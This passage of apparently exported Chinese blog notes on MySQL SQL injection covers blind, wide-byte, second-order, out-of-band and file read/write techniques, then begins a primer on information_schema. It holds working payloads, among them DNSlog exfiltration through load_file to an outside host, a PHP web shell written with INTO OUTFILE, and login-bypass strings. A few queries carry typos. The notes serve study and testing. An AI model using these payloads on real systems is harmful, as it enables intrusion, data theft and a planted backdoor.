<p>笛卡尔积</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C;</span><br><span class="line">+------------+</span><br><span class="line">| count(*)   |</span><br><span class="line">+------------+</span><br><span class="line">| 2651020120 |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set (1 min 51.05 sec)</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>这种方法又叫做heavy query，可以通过选定一个大表来做笛卡儿积，但这种方式执行时间会几何倍数的提升，在站比较大的情况下会造成几何倍数的效果，实际利用起来非常不好用。</p>
<ul>
<li>GET_LOCK</li>
</ul>
<p>是pwnhub的一道题目<br>
利用场景是有条件限制的：需要提供长连接。在Apache+PHP搭建的环境中需要使用 mysql_pconnect函数来连接数据库。<br>
太少用到不赘述了<br>
<a href="https://zhuanlan.zhihu.com/p/35245598">https://zhuanlan.zhihu.com/p/35245598</a></p>
<ul>
<li>RLIKE</li>
</ul>
<p>通过rpad或repeat构造长字符串，加以计算量大的pattern，通过repeat的参数可以控制延时长短。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select rpad(&#39;a&#39;,4999999,&#39;a&#39;) RLIKE concat(repeat(&#39;(a.*)+&#39;,30),&#39;b&#39;);</span><br><span class="line">+-------------------------------------------------------------+</span><br><span class="line">| rpad(&#39;a&#39;,4999999,&#39;a&#39;) RLIKE concat(repeat(&#39;(a.*)+&#39;,30),&#39;b&#39;) |</span><br><span class="line">+-------------------------------------------------------------+</span><br><span class="line">|                                                           0 |</span><br><span class="line">+-------------------------------------------------------------+</span><br><span class="line">1 row in set (5.27 sec)</span><br></pre></td></tr></table></figure>
<h3 id="Mysql注入杂技">Mysql注入杂技</h3>
<h4 id="insert-update-delete注入">insert/update/delete注入</h4>
<p>这三类语句中可以报错注出数据，但我要写的是如何没有报错的情况下注出数据<br>
本质是在闭合语句后通过子查询进行注入，通常为盲注</p>
<h5 id="update">update</h5>
<p>一段我在实战中遇到的代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$result&#x3D;mysql_query(&quot;update ly set content&#x3D;&#39;$content&#39;,hf_content&#x3D;&#39;$hf_content&#39;,modi_date&#x3D;&#39;$modi_date&#39; where ly_id&#x3D;&#39;$ly_id&#39; &quot;);</span><br><span class="line">if(mysql_affected_rows())</span><br><span class="line">&#123;</span><br><span class="line">	echo &quot;&#123;\&quot;success\&quot;:true,\&quot;msg\&quot;:\&quot;回复成功!\&quot;&#125;&quot;;	</span><br><span class="line">&#125;else&#123;</span><br><span class="line"></span><br><span class="line">    echo &quot;&#123;\&quot;success\&quot;:false,\&quot;msg\&quot;:\&quot;回复失败!\&quot;&#125;&quot;;	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>set 和 where 处都可以注入<br>
建议在where处进行注入</p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; and sleep(1) %23</span><br></pre></td></tr></table></figure>
<p>但是有不少的坑点，因为是根据mysql_affected_rows()判断来进行回显的，所以在update相同的值是并不会affected rows的，但是语句是可以执行的</p>
<p>但是字符型又有另一个坑点<br>
字符型在与数字进行与逻辑运算时会当被做0来处理，所以无法执行and后的sleep。<br>
所以我们只能用 <code>or</code>,<code>||</code>,<code>xor</code>,<code>^</code></p>
<p>但是或逻辑运算中同样存在问题</p>
<p>（但是具体好像还和mysql版本有关，因为看别人blog字符+or也执行成功了，但是先先不填坑了）<br>
测试只有字符为0时才会执行or后的sleep</p>
<p>应该是和逻辑运算的方式有关，或运算会先检验前面是否为真，只有当前面为字符0时才为假，这是和与运算的不同之处</p>
<p>异或的坑点和或相似<br>
当字符不为数字时不会执行，具体深层原因先留坑吧</p>
<p>这里还有坑…</p>
<p>or活着xor都可能导致多次sleep，因为每次检索都会or一次<br>
实战中要尽量避免这个问题，能布尔盲注的时候就不要用sleep了<br>
要避免这个问题就要用与逻辑且前面为真，放到where就是前面必须where一个存在的值</p>
<p>测试mysql版本5.3.72</p>
<h5 id="insert-delete">insert/delete</h5>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">insert into users values (1,&#39;&#123;injecthere&#125;&#39;,&#39;password&#39;);</span><br></pre></td></tr></table></figure>
<p>类似update，不赘述了</p>
<h4 id="Order-by注入">Order by注入</h4>
<p>本质仍然是盲注，根据order by 0 或者 1 返回不同的排序进行注入<br>
ctf中的进阶形式为order by 一个特定字段<br>
比如hctf中的一道题目</p>
<h4 id="宽字节注入">宽字节注入</h4>
<p><strong>原理</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">mysql_query(&quot;SET NAMES &#39;gbk&#39;&quot;);</span><br><span class="line">....</span><br><span class="line">$name &#x3D; isset($_GET[&#39;name&#39;]) ? addslashes($_GET[&#39;name&#39;]) : 1;</span><br><span class="line">$sql &#x3D; &quot;SELECT * FROM test WHERE names&#x3D;&#39;&#123;$name&#125;&#39;&quot;;</span><br></pre></td></tr></table></figure>
<p>即服务器使用了款字节编码，addslashes会将单引号转义，变为\‘,而宽子节会把两个字符编码为一个汉字，所以如果拼接%df，那%df%5c就会被编码为運字，从而逃逸出转义。</p>
<p>具体拼接什么要根据数据库使用的编码来决定，可以去查编码表。</p>
<p>常见payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;1%df&#39; #</span><br></pre></td></tr></table></figure>
<h4 id="Mysql约束攻击">Mysql约束攻击</h4>
<p><strong>原理</strong><br>
主要两个点</p>
<ul>
<li>mysql的select查询进行字符串比较的时候,不同长度的字符串,会用空格填充到相同字符在比较。</li>
<li>mysql插入数据的时候,当数据超过定义的长度会出现截断象限</li>
</ul>
<p>利用方式即注册一’admin     a’用户(中间空格超长截断)，达到超长截断的目的，往数据库中写入一个’admin   ’用户，而在select的过程中’admin ‘是与’admin’相等的</p>
<p>所以就可以用’admin ‘的密码登陆’admin’</p>
<h4 id="二次注入">二次注入</h4>
<p>所谓二次注入是指已存储（数据库、文件）的用户输入被读取后再次进入到 SQL 查询语句中导致的注入。</p>
<p>二次注入是sql注入的一种，但是比普通sql注入利用更加困难，利用门槛更高。普通注入数据直接进入到 SQL 查询中，而二次注入则是输入数据经处理后存储，取出后，再次进入到 SQL 查询。</p>
<p>二次注入的原理，在第一次进行数据库插入数据的时候，仅仅只是使用了 addslashes 或者是借助 get_magic_quotes_gpc 对其中的特殊字符进行了转义，在写入数据库的时候还是保留了原来的数据，但是数据本身还是脏数据。</p>
<p>在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次进行需要进行查询的时候，直接从数据库中取出了脏数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。比如在第一次插入数据的时候，数据中带有单引号，直接插入到了数据库中；然后在下一次使用中在拼凑的过程中，就形成了二次注入。</p>
<p>这个。。只能具体情况分析了，不太好写</p>
<p>比如sql lab-24</p>
<h4 id="Mysql带外注入">Mysql带外注入</h4>
<p>带外通道攻击主要是利用其他协议或者渠道从服务器提取数据<br>
它可能是HTTP（S）请求，DNS解析服务，SMB服务，Mail服务等</p>
<h5 id="DNSlog">DNSlog</h5>
<p>只能用于windows环境</p>
<p>select拼接一个UNC路径导致请求发起<br>
UNC是一种命名惯例, 主要用于在Microsoft Windows上指定和映射网络驱动器. UNC命名惯例最多被应用于在局域网中访问文件服务器或者打印机。我们日常常用的网络共享文件就是这个方式。<br>
其实我们平常在Widnows中用共享文件的时候就会用到这种网络地址的形式</p>
<p>\<a href="http://sss.xxx">sss.xxx</a>\test\</p>
<p>常见payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select load_file(&#39;\\\\&#39;,select hex(version()),&#39;.dnslog地址&#39;)</span><br></pre></td></tr></table></figure>
<p>这也就解释了为什么CONCAT()函数拼接了4个\了，因为转义的原因，4个\就变成了2个\，目的就是利用UNC路径</p>
<p>可以直接直接用ceye.io这个平台，这个平台就集成了Dnslog的功能</p>
<p>利用方法</p>
<p>首先查看变量确定权限<br>
show variables like ‘%secure%’</p>
<ul>
<li>当secure_file_priv为空，就可以读取磁盘的目录。</li>
<li>当secure_file_priv为G:\，就可以读取G盘的文件。</li>
<li>当secure_file_priv为null，load_file就不能加载文件。</li>
</ul>
<p>在mysql 5.5.34版本默认为空可以加载文件 但是之后版本为NULL会禁用函数但是<br>
可以通过mysql的配置文件my.ini添加行进行配置</p>
<p>最好进行加密处理，防止特殊字符导致传输失败<br>
payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select load_file(concat(0x5c5c5c5c,select hex(version()),0x2E66326362386131382E646E736C6F672E6C696E6B2F2F616263));</span><br></pre></td></tr></table></figure>
<h4 id="文件读写">文件读写</h4>
<p>查询用户读写权限</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT file_priv FROM mysql.user WHERE user &#x3D; &#39;username&#39;;</span><br></pre></td></tr></table></figure>
<ul>
<li>load_file()</li>
</ul>
<p>需要有读取文件的权限<br>
需要知道文件的绝对物理路径<br>
要读取的文件大小必须小于 max_allowed_packet</p>
<p>一般没啥问题</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT @@max_allowed_packet;</span><br></pre></td></tr></table></figure>
<p>一般用load_file来看config.php（即mysql的密码）,apache配置、servu密码等。前提是要知道物理路径。</p>
<p>常见paylaod</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">UNION SELECT LOAD_FILE(&quot;C:&#x2F;&#x2F;TEST.txt&quot;) #</span><br><span class="line">UNION SELECT LOAD_FILE(&quot;C:&#x2F;TEST.txt&quot;) #</span><br><span class="line">UNION SELECT LOAD_FILE(&quot;C:\\TEST.txt&quot;) #</span><br></pre></td></tr></table></figure>
<p>后面的路径可以是单引号、0x、char转换的字符<br>
路径中的斜杠是/而不是\</p>
<p>使用编码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">UNION SELECT LOAD_FILE(CHAR(67,58,92,92,84,69,83,84,46,116,120,116)) #</span><br><span class="line">UNION SELECT LOAD_FILE(0x433a5c5c544553542e747874) #</span><br></pre></td></tr></table></figure>
<ul>
<li>out_file()</li>
</ul>
<p>outfile后面不能接0x开头或者char转换以后的路径，只能是单引号路径<br>
经典一句话payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select &#39;&lt;?php eval($_POST[cmd])?&gt;&#39; into outfile &#39;C:&#x2F;www&#x2F;shell.php&#39;</span><br></pre></td></tr></table></figure>
<p>当然也可以从表中选数据写</p>
<h4 id="万能密码">万能密码</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin’ —</span><br><span class="line">admin’ #</span><br><span class="line">admin’&#x2F;*</span><br><span class="line">or ‘&#x3D;’ or</span><br><span class="line">‘ or 1&#x3D;1—</span><br><span class="line">‘ or 1&#x3D;1#</span><br><span class="line">‘ or 1&#x3D;1&#x2F;*</span><br><span class="line">‘) or ‘1’&#x3D;’1—</span><br><span class="line">‘) or (‘1’&#x3D;’1—</span><br></pre></td></tr></table></figure>
<h2 id="UPDATE">UPDATE</h2>
<h3 id="利用MySQL8新特性绕过select过滤">利用MySQL8新特性绕过select过滤</h3>
<p>在MySQL 8.0.19之后，MySQL推出几种新语法：</p>
<ul>
<li><strong>TABLE statement</strong> - 列出表中全部内容</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; TABLE user;</span><br><span class="line">+----+----------+---------+</span><br><span class="line">| id | username | passwd  |</span><br><span class="line">+----+----------+---------+</span><br><span class="line">|  1 | admin    | adminpw |</span><br><span class="line">|  2 | tom      | tompw   |</span><br><span class="line">|  3 | kak      | kakpw   |</span><br><span class="line">+----+----------+---------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>VALUES statement</strong> - 列出一行的值</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; VALUES ROW(1, 2, 3) UNION SELECT * FROM user;</span><br><span class="line">+----------+----------+----------+</span><br><span class="line">| column_0 | column_1 | column_2 |</span><br><span class="line">+----------+----------+----------+</span><br><span class="line">|        1 | 2        | 3        |</span><br><span class="line">|        1 | admin    | adminpw  |</span><br><span class="line">|        2 | tom      | tompw    |</span><br><span class="line">|        3 | kak      | kakpw    |</span><br><span class="line">+----------+----------+----------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
<p>假设以下代码是在过滤select, handler以及禁用堆叠注入的情景下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($_GET[<span class="string">&#x27;showme&#x27;</span>]))</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"> </span><br><span class="line">$aaa = mysqli_connect(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;rootroot&#x27;</span>, <span class="string">&#x27;test&#x27;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>($_GET[<span class="string">&#x27;id&#x27;</span>]))</span><br><span class="line">    $id = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    $id = $_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"> </span><br><span class="line">$clean = strtolower($id);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (strpos($clean, <span class="string">&#x27;select&#x27;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;waf&#x27;</span>;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">var_dump(<span class="string">&quot;select * from news where <span class="subst">$id</span>=&#x27;<span class="subst">$id</span>&#x27;&quot;</span>);</span><br><span class="line">$result = mysqli_query($aaa, <span class="string">&quot;select * from news where id =&#x27;<span class="subst">$id</span>&#x27;&quot;</span>);</span><br><span class="line">$row = mysqli_fetch_array($result);</span><br><span class="line">$title = $row[<span class="string">&#x27;title&#x27;</span>];</span><br><span class="line">$content = $row[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;<span class="subst">$title</span>&lt;/h1&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;<span class="subst">$content</span>&lt;/h2&gt;&lt;br&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>构造恶意sql语句</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from news where $id&#x3D;&#39;&#39; or (1,&#39;admin&#39;,&#39;&#123;passwd&#125;&#39;) &lt;&#x3D; (table user limit 1)#</span><br></pre></td></tr></table></figure>
<p>语句table user limit 1的查询结果如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+----+----------+---------+</span><br><span class="line">| id | username | passwd  |</span><br><span class="line">+----+----------+---------+</span><br><span class="line">|  1 | admin    | adminpw |</span><br><span class="line">+----+----------+---------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
<p>实质上是<code>(id, username, passwd)</code>与<code>(1, 'admin', 'adminpw')</code>进行比较，比较顺序为自左向右 两个元组第一个字符比大小，如果第一个字符相等就比第二个字符的大小，以此类推，最终结果即为元组的大小</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT (1, &#39;&#39;, &#39;&#39;) &lt; (TABLE user LIMIT 1);</span><br><span class="line">+-------------------------------------+</span><br><span class="line">| (1, &#39;&#39;, &#39;&#39;) &lt; (TABLE user LIMIT 1)  |</span><br><span class="line">+-------------------------------------+</span><br><span class="line">|                                   1 |</span><br><span class="line">+-------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"> </span><br><span class="line">mysql&gt; SELECT (2, &#39;&#39;, &#39;&#39;) &lt; (TABLE user LIMIT 1);</span><br><span class="line">+-------------------------------------+</span><br><span class="line">| (2, &#39;&#39;, &#39;&#39;) &lt; (TABLE user LIMIT 1)  |</span><br><span class="line">+-------------------------------------+</span><br><span class="line">|                                   0 |</span><br><span class="line">+-------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"> </span><br><span class="line">mysql&gt; SELECT (1, &#39;a&#39;, &#39;&#39;) &lt; (TABLE user LIMIT 1);</span><br><span class="line">+--------------------------------------+</span><br><span class="line">| (1, &#39;a&#39;, &#39;&#39;) &lt; (TABLE user LIMIT 1)  |</span><br><span class="line">+--------------------------------------+</span><br><span class="line">|                                    1 |</span><br><span class="line">+--------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"> </span><br><span class="line">mysql&gt; SELECT (1, &#39;ad&#39;, &#39;&#39;) &lt; (TABLE user LIMIT 1);</span><br><span class="line">+---------------------------------------+</span><br><span class="line">| (1, &#39;ad&#39;, &#39;&#39;) &lt; (TABLE user LIMIT 1)  |</span><br><span class="line">+---------------------------------------+</span><br><span class="line">|                                     1 |</span><br><span class="line">+---------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"> </span><br><span class="line">mysql&gt; SELECT (1, &#39;ae&#39;, &#39;&#39;) &lt; (TABLE user LIMIT 1);</span><br><span class="line">+---------------------------------------+</span><br><span class="line">| (1, &#39;ae&#39;, &#39;&#39;) &lt; (TABLE user LIMIT 1)  |</span><br><span class="line">+---------------------------------------+</span><br><span class="line">|                                     0 |</span><br><span class="line">+---------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
<p>转载自：<a href="https://0xgeekcat.github.io/%E5%88%A9%E7%94%A8MySQL8%E6%96%B0%E7%89%B9%E6%80%A7%E7%BB%95%E8%BF%87select%E8%BF%87%E6%BB%A4.html">https://0xgeekcat.github.io/利用MySQL8新特性绕过select过滤.html</a></p>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>基础学习</category>
      </categories>
      <tags>
        <tag>Web安全学习</tag>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>Web安全学习之MySQL的系统表、文件读写和Hash密码爆破</title>
    <url>/Web_security/basic_learning/3.MySQL%E7%9A%84%E7%B3%BB%E7%BB%9F%E8%A1%A8%E3%80%81%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E5%92%8CHash%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/</url>
    <content><![CDATA[<h1 id="Web安全学习之MySQL的系统表、文件读写和Hash密码爆破">Web安全学习之MySQL的系统表、文件读写和Hash密码爆破</h1>
<h2 id="任务目标">任务目标</h2>
<ol>
<li>学习数据库系统表的功能，如何利用SQL语句查询库名、表名、字段名、内容以及当前用户等基本信息；</li>
<li>如何利用数据库的功能读写文件，需要什么样的条件才可以读写；</li>
<li>扩展：查询用户的哈希值，并使用hashcat来对获取的hash进行暴力破解。</li>
</ol>
<h2 id="0x01-MySQL系统表">0x01 MySQL系统表</h2>
<h3 id="一、information-schema">一、information_schema</h3>
<p><strong>数据库元数据：</strong></p>
<p>元数据(meta data)——“data about data” 关于数据的数据，一般是结构化数据（如存储在数据库里的数据，规定了字段的长度、类型等）。所以metadata就是描述数据的数据，在MySQL中就是描述database的数据。有哪些数据库、每个表有哪些表、表有多少字段、字段是什么类型等等，这样的数据就是数据库的元数据。</p>
<p>综上，我们可以称<code>information_schema</code>是一个<strong>元数据库</strong>。它就像物业公司的信息库，对管理的每栋大厦有多少电梯、电梯型号、每个房间的长宽高等等了如指掌。</p>
<ol>
<li>
<h5 id="SCHEMATA">SCHEMATA</h5>
<p>提供数据库信息，有哪些数据库，字符集是GBK还是UTF-8等等。</p>
<p>所有字段名：</p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g62uv0t1q0j20kp03ot97.jpg" alt=""></p>
<p>其中某一条数据：</p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g62uxo6ljvj20nw01d0so.jpg" alt=""></p>
<p><strong>命令<code>SHOW DATABASES;</code>的结果取自此表</strong></p>
</li>
<li>
<h5 id="TABLES">TABLES</h5>
<p>提供表的信息，数据库有哪些表，是什么存储引擎等等。</p>
<p>所有字段名：</p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g62v12v0n0j20jj0ct76r.jpg" alt=""></p>
<p>常用字段包含：</p>
<table>
<thead>
<tr>
<th>字段名</th>
<th>含义</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr>
<td>TABLE_SCHEMA</td>
<td>数据库名</td>
<td></td>
</tr>
<tr>
<td>TABLE_NAME</td>
<td>表名</td>
<td></td>
</tr>
<tr>
<td>TABLE_TYPE</td>
<td>表的类型</td>
<td></td>
</tr>
<tr>
<td>ENGINE</td>
<td>存储引擎</td>
<td></td>
</tr>
<tr>
<td>CREATE_TIME</td>
<td>建表时间</td>
<td></td>
</tr>
</tbody>
</table>
<p>其中某几条记录：</p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g62v61aw7vj20mw03x0td.jpg" alt=""></p>
<p><strong>命令<code>SHOW TABLES;</code>的结果取自此表</strong></p>
</li>
<li>
<h5 id="COLUMNS">COLUMNS</h5>
<p>提供字段的信息，有哪些字段字段类型是什么等等。</p>
<p>所有字段名：</p>
<p><img src="https://i.loli.net/2019/09/17/TjK7MfrFC8zOUun.png" alt=""></p>
<p>常用字段名：</p>
<table>
<thead>
<tr>
<th>字段名</th>
<th>含义</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr>
<td>SCHEMA_NAME</td>
<td>数据库名</td>
<td></td>
</tr>
<tr>
<td>TABLE_NAME</td>
<td>表名</td>
<td></td>
</tr>
<tr>
<td>COLUMN_NAME</td>
<td>字段名</td>
<td></td>
</tr>
<tr>
<td>COLUMN_TYPE</td>
<td>字段类型</td>
<td>如int(10),varchar(250)</td>
</tr>
</tbody>
</table>
<p>其中某几条记录：</p>
<p><img src="https://i.loli.net/2019/09/17/EPrSgVZfpLx1TN7.png" alt=""></p>
<p><strong>等同命令：<code>SHOW COLUMNS</code> 或者 <code>desc learnSQL.customers</code> 看emp表的具体字段。</strong></p>
</li>
<li>
<h5 id="STATISTICS">STATISTICS</h5>
<p>这张表的单词是统计的意思，但是却是索引的信息。</p>
<blockquote>
<p><a href="https://www.liaoxuefeng.com/wiki/1177760294764384/1218728442198976">什么是索引</a></p>
</blockquote>
<p>所有字段名：</p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g62vhu74ggj20ib0a0768.jpg" alt=""></p>
<table>
<thead>
<tr>
<th>字段名</th>
<th>含义</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr>
<td>SCHEMA_NAME</td>
<td>数据库名</td>
<td></td>
</tr>
<tr>
<td>TABLE_NAME</td>
<td>表名</td>
<td></td>
</tr>
<tr>
<td>INDEX_SCHEMA</td>
<td>也是数据库名</td>
<td></td>
</tr>
<tr>
<td>INDEX_NAME</td>
<td>索引名</td>
<td></td>
</tr>
<tr>
<td>COLUMN_NAME</td>
<td>字段名</td>
<td></td>
</tr>
<tr>
<td>INDEX_TYPE</td>
<td>索引类型</td>
<td>一般是B-Tree</td>
</tr>
</tbody>
</table>
<p>其中几条记录：</p>
<p><img src="https://i.loli.net/2019/09/17/6wPdHmi3ylEFJ5t.png" alt=""></p>
<p><strong>等同于命令：<code>SHOW INDEX;</code></strong></p>
</li>
<li>
<h5 id="TABLE-CONSTRAINTS">TABLE_CONSTRAINTS</h5>
<p>提供约束情况，我们想看看表有哪些约束？约束指的是唯一性约束、主键约束、外键约束。</p>
<p>所有字段名：</p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g62xqyr7lzj20kq0430td.jpg" alt=""></p>
<p>常用字段名：</p>
<table>
<thead>
<tr>
<th>字段名</th>
<th>含义</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr>
<td>CONSTRAINT_SCHEMA</td>
<td>数据库名</td>
<td></td>
</tr>
<tr>
<td>CONSTRAINT_NAME</td>
<td>约束名</td>
<td></td>
</tr>
<tr>
<td>TABLE_SCHEMA</td>
<td>也是数据库名</td>
<td></td>
</tr>
<tr>
<td>TABLE_NAME</td>
<td>表名</td>
<td></td>
</tr>
<tr>
<td>CONSTRAINT_TYPE</td>
<td>约束类型</td>
<td>UNIQUE、PRIMARY KEY、FOREIGN KEY</td>
</tr>
</tbody>
</table>
<p>其中几条记录：</p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g62xt8hqe4j20qc07c3zm.jpg" alt=""></p>
<blockquote>
<p>唯一约束和主键约束，我们在前面的索引中一样可以查到</p>
</blockquote>
</li>
<li>
<h5 id="KEY-COLUMN-USAGE">KEY_COLUMN_USAGE</h5>
<p>有STATISTICS和TABLE_CONSTRAINTS表，为什么还需要KEY_COLUMN_USAGE？<br>
因为外键时没有指出参考的是哪张表的哪个字段！</p>
<p>所有字段：</p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g62xvqbu0dj20my07lmys.jpg" alt=""></p>
<p>常用字段：</p>
<table>
<thead>
<tr>
<th>字段名</th>
<th>含义</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr>
<td>CONSTRAINT_SCHEMA</td>
<td>数据库名</td>
<td></td>
</tr>
<tr>
<td>CONSTRAINT_NAME</td>
<td>约束名</td>
<td>PRIMARY或列名或外键名</td>
</tr>
<tr>
<td>TABLE_SCHEMA</td>
<td>也是数据库名</td>
<td></td>
</tr>
<tr>
<td>TABLE_NAME</td>
<td>表名</td>
<td></td>
</tr>
<tr>
<td>COLUMN_NAME</td>
<td>列名</td>
<td></td>
</tr>
<tr>
<td>REFERENCED_TABLE_SCHEMA</td>
<td>参考的数据库</td>
<td></td>
</tr>
<tr>
<td>REFERENCED_TABLE_NAME</td>
<td>参考的表</td>
<td></td>
</tr>
<tr>
<td>REFERENCED_COLUMN_NAME</td>
<td>参考的列</td>
<td></td>
</tr>
</tbody>
</table>
<p>其中几条记录：</p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g62xzsvazsj20z107z0uc.jpg" alt=""></p>
<p>相比前面两个，KEY_COLUMN_USAGE这个表的信息是最全的。包括主键、外键、唯一约束。</p>
</li>
<li>
<h5 id="VIEWS">VIEWS</h5>
<p>查询数据库下所有的视图。</p>
<p>所有字段名：</p>
<p><img src="https://i.loli.net/2019/09/17/197OPxmJczE8I3e.png" alt=""></p>
<p>常用字段名：</p>
<table>
<thead>
<tr>
<th>字段名</th>
<th>含义</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr>
<td>TABLE_SCHEMA</td>
<td>数据库名</td>
<td></td>
</tr>
<tr>
<td>TABLE_NAME</td>
<td>表名</td>
<td></td>
</tr>
<tr>
<td>VIEW_DEFINITION</td>
<td>视图定义语句</td>
<td></td>
</tr>
</tbody>
</table>
</li>
<li>
<h5 id="其他部分表">其他部分表</h5>
<ul>
<li><strong>ENGINES</strong>：列举了当前数据库对InnoDB、MEMORY、MyISAM等各种存储引擎的支持情况。等同<code>show ENGINES</code></li>
<li><strong>GLOBAL_VARIABLES</strong>：服务器变量设置，一些开关和设置。等同命令<code>show global variables</code>。除了global还有session。</li>
<li><strong>PLUGINS</strong>：MySQL的插件列表。可以看到存储引擎InnoDB甚至binlog都是插件！binlog是强制加载的，InnoDB是默认打开的。等同命令<code>show PLUGINS</code></li>
<li><strong>PROCESSLIST</strong>：查看正在运行的线程！比如我查这个表，就看到一个查询的线程。等同命令<code>show full processlist</code></li>
</ul>
</li>
</ol>
<h3 id="二、Performance-schema">二、Performance_schema</h3>
<p>主要用于收集数据库服务器性能参数。并且库里表的存储引擎均为PERFORMANCE_SCHEMA，而用户是不能创建存储引擎为PERFORMANCE_SCHEMA的表。MySQL5.7默认是开启的。</p>
<p>参考：<a href="https://www.cnblogs.com/zhoujinyi/p/5236705.html">Performance_schema</a></p>
<h3 id="三、mysql">三、mysql</h3>
<p>mysql的核心数据库，类似于sql server中的master表，主要负责存储数据库的用户、权限设置、关键字等mysql自己需要使用的控制和管理信息。(常用的，在mysql.user表中修改root用户的密码)。</p>
<blockquote>
<p>如何利用SQL语句查询库名、表名、字段名、内容以及当前用户等基本信息</p>
<ul>
<li>查询库名：<code>SELECT schema_name FROM infomation_schema.schemata;</code></li>
<li>查询表名：<code>SELECT table_name FROM information_schema.tables WHERE table_schema='test'</code>;</li>
<li>查询字段名：<code>SELECT column_name FROM information_schema.columns WHERE table_name='col'</code>;</li>
<li>查询记录：<code>SELECT * FORM test.col;</code></li>
</ul>
</blockquote>
<h2 id="0x02-读写文件">0x02 读写文件</h2>
<h3 id="一、利用数据库读取文件">一、利用数据库读取文件</h3>
<ol>
<li>
<h5 id="使用system命令">使用system命令</h5>
<ul>
<li>
<p>查看文件</p>
